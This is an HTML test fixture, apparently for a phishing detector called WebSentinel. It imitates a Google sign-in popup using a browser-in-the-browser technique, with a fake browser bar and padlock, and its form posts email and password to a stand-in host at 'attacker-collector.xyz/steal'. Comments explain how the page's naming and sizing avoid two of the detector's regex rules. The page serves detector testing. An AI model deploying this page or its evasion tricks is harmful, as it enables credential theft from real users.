<!DOCTYPE html>
<!--
  WebSentinel — BitB Anomaly Score Test Page (75%)
  EDUCATIONAL / RESEARCH USE ONLY

  L1 target heuristic: 0.75
  Triggers:
    Rule 1 (+0.40): <iframe style="position:fixed;...z-index:99999;...">
    Rule 2 (+0.20): z-index:99999 in the same iframe style attribute
    Rule 4 (+0.15): ondragstart="return false" on <body>
  Does NOT trigger:
    Rule 3 — iframe uses width:50%;height:60% (not 100vw/100% pair); bg-page
              has width:100vw but NOT height:100vh (uses min-height instead)
    Rule 5 — URL bar uses class="url-display"; no "browser.*bar" or "address.*bar"
              anywhere in the document
-->
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <title>Google - Sign in to your account</title>
  <link rel="icon" href="https://accounts.google.com/favicon.ico"/>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      background: #202124;
      font-family: 'Google Sans', Arial, sans-serif;
      /* Rule 4: drag prevention is applied via ondragstart attribute on body tag,
         NOT via user-select:none here. Using the HTML attribute form. */
      overflow: hidden;
    }

    /*
      Background page.
      width:100vw is present here but height uses min-height (NOT height:100vh).
      Rule 3 requires BOTH "width:100(vw|%)" AND "height:100(vh|%)" to appear.
      Since height:100vh is absent from the entire document, Rule 3 cannot fire.
    */
    .bg-page {
      width: 100vw;
      min-height: 800px;        /* deliberately NOT height:100vh */
      background: linear-gradient(135deg, #202124 0%, #303134 100%);
      display: flex;
      align-items: center;
      justify-content: center;
      color: #9aa0a6;
      font-size: 14px;
    }

    /* Popup wrapper: positions and sizes the popup frame */
    .popup-container {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 500px;
      height: 580px;
      border-radius: 8px;
      overflow: hidden;
      box-shadow: 0 24px 80px rgba(0,0,0,0.9);
    }

    /* Fake browser chrome bar overlaid above the iframe */
    .chrome-bar {
      background: #3c4043;
      height: 52px;
      display: flex;
      align-items: center;
      padding: 0 12px;
      gap: 10px;
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      z-index: 100000;
    }

    .win-buttons { display: flex; gap: 6px; flex-shrink: 0; }
    .win-btn {
      width: 13px;
      height: 13px;
      border-radius: 50%;
    }
    .btn-close    { background: #ff5f57; }
    .btn-minimize { background: #febc2e; }
    .btn-maximize { background: #28c840; }

    /*
      URL display bar.
      Class name "url-display" is deliberately chosen to avoid Rule 5.
      Rule 5 regex: (fake.*address|address.*bar|browser.*bar)
      "url-display" contains none of these patterns.
    */
    .url-display {
      flex: 1;
      background: #202124;
      border-radius: 20px;
      padding: 5px 14px;
      font-size: 12px;
      color: #e8eaed;
      display: flex;
      align-items: center;
      gap: 6px;
      height: 30px;
    }

    .padlock-icon { color: #34a853; font-size: 11px; flex-shrink: 0; }

    .url-text {
      font-size: 12px;
      color: #bdc1c6;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }

    /* Content panel behind and around the iframe */
    .content-panel {
      position: absolute;
      top: 52px;
      left: 0;
      width: 100%;
      height: calc(100% - 52px);
      background: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 32px;
    }
  </style>
</head>
<!--
  RULE 4 TRIGGER (+0.15): ondragstart="return false" on <body>
  Regex: (ondragstart|onselectstart|user-select\s*:\s*none)
  The "ondragstart" token in the body tag triggers this rule.
-->
<body ondragstart="return false">

  <!-- Background layer -->
  <div class="bg-page">
    <p>Please wait...</p>
  </div>

  <!-- Popup container: chrome bar + iframe + content panel -->
  <div class="popup-container">

    <!-- Fake browser chrome bar (sits above the iframe visually) -->
    <div class="chrome-bar">
      <div class="win-buttons">
        <span class="win-btn btn-close"></span>
        <span class="win-btn btn-minimize"></span>
        <span class="win-btn btn-maximize"></span>
      </div>
      <!--
        URL display: class="url-display" — safe name.
        NOT "browser-bar", NOT "address-bar", NOT "nav-bar".
        Does NOT match Rule 5 patterns.
      -->
      <div class="url-display">
        <span class="padlock-icon">&#128274;</span>
        <span class="url-text">https://accounts.google.com/signin/v2/identifier</span>
      </div>
    </div>

    <!--
      RULE 1 TRIGGER (+0.40): <iframe> with inline style containing position:fixed
      Regex: <iframe[^>]*style=["'][^"']*position\s*:\s*fixed

      RULE 2 TRIGGER (+0.20): z-index:99999 inside the style attribute
      Regex: z-index\s*:\s*(99[0-9]{2,}|[1-9]\d{4,})

      RULE 3 AVOIDANCE: width:50% and height:60% — neither matches 100(vw|%)
      Rule 3 requires BOTH width:100(vw|%) AND height:100(vh|%) in the DOM.
      "50%" matches the pattern "\d+%" but not specifically "100(vw|%)".
    -->
    <iframe
      src="about:blank"
      style="position:fixed;top:52px;left:0;width:50%;height:60%;z-index:99999;border:none;background:#fff;"
    ></iframe>

    <!-- Phishing form content panel (visible in the uncovered popup area) -->
    <div class="content-panel">
      <div style="font-size:22px;font-weight:400;color:#202124;margin-bottom:6px;">
        <span style="color:#4285f4">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span>
      </div>
      <h2 style="font-size:24px;font-weight:400;color:#202124;margin-bottom:6px;">Sign in</h2>
      <p style="font-size:14px;color:#5f6368;margin-bottom:24px;">to continue to Google Account</p>

      <form action="http://attacker-collector.xyz/steal" method="POST" style="width:100%;">
        <input type="hidden" name="campaign" value="bitb-anomaly-75"/>
        <div style="margin-bottom:16px;">
          <input type="email" name="email" placeholder="Email or phone"
                 autocomplete="off"
                 style="width:100%;border:1px solid #dadce0;border-radius:4px;
                        padding:13px 15px;font-size:14px;color:#202124;outline:none;"/>
        </div>
        <div style="margin-bottom:16px;">
          <input type="password" name="password" placeholder="Enter your password"
                 autocomplete="off"
                 style="width:100%;border:1px solid #dadce0;border-radius:4px;
                        padding:13px 15px;font-size:14px;color:#202124;outline:none;"/>
        </div>
        <div style="display:flex;justify-content:flex-end;">
          <button type="submit"
                  style="background:#1a73e8;color:#fff;border:none;border-radius:4px;
                         padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;">
            Next
          </button>
        </div>
      </form>

      <p style="font-size:10px;color:#9aa0a6;margin-top:18px;text-align:center;">
        [WebSentinel Test Page — L1 Target: 0.75 — Not a real Google page]
      </p>
    </div>

  </div>

</body>
</html>
